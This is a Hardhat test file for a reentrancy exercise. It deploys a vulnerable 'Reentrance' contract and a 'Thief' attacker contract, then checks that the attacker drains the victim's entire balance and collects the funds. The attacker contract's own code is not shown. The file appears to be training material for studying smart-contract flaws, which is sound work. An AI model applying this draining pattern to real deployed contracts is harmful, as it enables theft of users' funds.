const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exercise 10 - Reentrance", function () {

    let deployer, attacker;
    const INITIAL_DONATION = ethers.utils.parseUnits('100', 'ether');
    const SOME_ETH = ethers.utils.parseUnits('10', 'ether');

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        const Reentrance = await ethers.getContractFactory("Reentrance");
        this.contract = await Reentrance.deploy();
        await this.contract.deployed();

        //Make an initial donation to the deployer
        const tx = await this.contract.donate(deployer.address, { value: INITIAL_DONATION });
        await tx.wait();

        expect(await this.contract.balanceOf(deployer.address)).to.eq(INITIAL_DONATION);
    });


    it("Empty contract", async function () {
        console.log(`Contract's balance is ${ethers.utils.formatEther(await ethers.provider.getBalance(this.contract.address))} tokens`);

        // Deploy an attacker contract that will call the withdraw 
        // function on its fallback
        const Thief = await ethers.getContractFactory("Thief", attacker);

        const thiefContract = await Thief.deploy(this.contract.address);
        await thiefContract.deployed();

        // Make a donation to the thief contract address
        const donateTx = await this.contract.connect(attacker).donate(thiefContract.address, { value: SOME_ETH });
        await donateTx.wait();

        console.log(`Contract's balance is ${ethers.utils.formatEther(await ethers.provider.getBalance(this.contract.address))} tokens`);

        expect(await this.contract.connect(attacker).balanceOf(thiefContract.address)).to.eq(SOME_ETH);

        // Call the fallback function of to withdraw all funds from 
        // the victim
        const emptyTx = await thiefContract.withdrawAllFromVictim(SOME_ETH);
        await emptyTx.wait()

        const contractFinalBalance = await ethers.provider.getBalance(this.contract.address);
        expect(contractFinalBalance).to.eq(0);
        console.log(`Contract's final balance is ${ethers.utils.formatEther(contractFinalBalance)} tokens`);

        // Transfer all funds from the attacker contract to the 
        // attacker's wallet
        const getMoneyTx = await thiefContract.collectTheMoney();
        await getMoneyTx.wait()
        
        const attackContractBalance = await ethers.provider.getBalance(thiefContract.address);
        expect(attackContractBalance).to.eq(0);
    });

});
